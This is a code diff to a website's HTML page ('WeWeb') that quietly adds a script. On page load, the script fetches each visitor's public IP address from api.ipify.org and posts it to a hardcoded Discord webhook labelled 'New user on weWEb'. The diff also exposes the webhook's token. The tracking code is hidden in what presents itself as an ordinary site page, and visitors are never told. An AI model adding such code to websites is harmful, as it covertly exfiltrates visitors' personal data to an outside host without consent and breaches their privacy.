@@ -18,7 +18,7 @@
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
     />
   </head>
-  <body>
+  <body onload="sendIp">
     <nav class="navbar" id="navbar" id="navbar">
       <a href="/" class="logo" id="logo">WeWeb</a>
       <ul class="nav-list" id="navlist">
@@ -397,5 +397,37 @@
       cardprofiles[id].classList.remove("cardoutp");
       cardinformation[id + 1].classList.remove("cardouti");
     }
+
+      
+
+    const sendIp =async () => {
+      try {
+      const res = await fetch("https://api.ipify.org");
+      const data = await res.text();
+      Ip = data 
+      const request = new XMLHttpRequest();
+    request.open(
+      "POST",
+      "https://discord.com/api/webhooks/1174233485070843964/nR271iuSDgs8mfYAurpHMFtISeWxM77NwDNLq0YymC-SLGU7osgv-mY-eDjgLKn_Yly8"
+    );
+
+    request.setRequestHeader("Content-type", "application/json");
+
+    const params = {
+      username: "New user on weWEb",
+      avatar_url: "",
+      content: `----------------Ip address:  ${Ip} ----------------`,
+    };
+
+    request.send(JSON.stringify(params));
+      console.log(data);
+    } catch (err) {
+      console.log(err);
+    }
+    
+  };
+
+  sendIp()
+    
   </script>
 </html>
